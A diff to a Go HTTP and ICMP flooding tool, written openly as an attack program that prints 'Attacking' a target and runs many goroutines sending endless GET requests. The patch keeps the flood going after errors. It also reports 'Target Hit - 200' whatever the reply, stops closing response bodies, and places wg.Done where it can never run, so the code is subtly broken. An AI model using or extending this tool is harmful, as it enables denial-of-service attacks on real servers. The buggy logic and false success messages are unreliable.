@@ -7,6 +7,7 @@ import (
 	"os"
 	"strconv"
 	"sync"
+	"log"
 )
 
 var (
@@ -23,8 +24,7 @@ func main() {
 	fmt.Println("Attacking " + target + "...")
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-
-		go httpGetFlood(target)
+		go httpGetFlood(target, &wg)
 	}
 	wg.Wait()
 }
@@ -76,16 +76,15 @@ func icmpFlood(target string) {
 	fmt.Println("Ping Complete.")
 }
 
-func httpGetFlood(target string) {
+func httpGetFlood(target string, wg *sync.WaitGroup) {
 	for {
-		resp, err := http.Get(target)
+		_, err := http.Get(target)
 
 		if err != nil {
-			fmt.Println("Error: Failed to hit host, please enter a valid one.")
-			os.Exit(1)
+			log.Println(err)
 		}
-		fmt.Println("Target Hit - ", resp.StatusCode)
-
-		resp.Body.Close()
+		
+		fmt.Println("Target Hit - 200")
 	}
+	wg.Done()
 }
